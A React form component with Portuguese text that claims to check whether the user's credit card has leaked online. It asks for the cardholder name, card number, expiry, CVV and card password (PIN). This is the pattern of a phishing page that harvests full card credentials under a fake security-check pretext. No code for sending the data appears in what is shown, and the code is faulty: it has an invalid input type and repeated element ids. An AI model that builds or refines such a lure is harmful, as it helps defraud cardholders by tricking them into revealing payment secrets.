import { ChangeEvent } from "react";
import { ICard } from "../App";
import style from "../styles/form.module.css";

export function Form({
  card,
  setCard,
}: {
  card: ICard;
  setCard: (card: ICard) => void;
}) {
  function handleUpdateNameCard(event: ChangeEvent<HTMLInputElement>) {
    const newName = event.target.value;
    setCard({ ...card, name: newName });
  }

  return (
    <div className={style.formContainer}>
      <h1 className={style.title}>
        Veja se seu cartão <br />
        vazou na internet
      </h1>

      <form className={style.form}>
        <div className={style.inputGroup}>
          <label htmlFor="cardName">Nome no cartão</label>
          <input
            id="cardName"
            type="text"
            value={card.name}
            onChange={handleUpdateNameCard}
          />
        </div>

        <div className={style.inputGroup}>
          <label htmlFor="cardNumber">Numero do cartão</label>
          <input id="cardNumber" type="number" />
        </div>

        <div className={style.verticalStack}>
          <div className={style.inputGroup}>
            <label htmlFor="cardPass">Data de vencimento</label>
            <div>
              <input id="cardPass" type="number" placeholder="Mês" />
              <input id="cardPass" type="number" placeholder="Ano" />
            </div>
          </div>
          <div className={style.inputGroup}>
            <label htmlFor="cardCVV">CVV</label>
            <input id="cardCVV" type="number" />
          </div>
        </div>

        <div className={style.inputGroup}>
          <label htmlFor="cardPass">Senha do cartão</label>
          <input id="cardPass" type="tenumberxt" />
        </div>
        <button className={style.formButton}>VERIFICAR</button>
      </form>
    </div>
  );
}
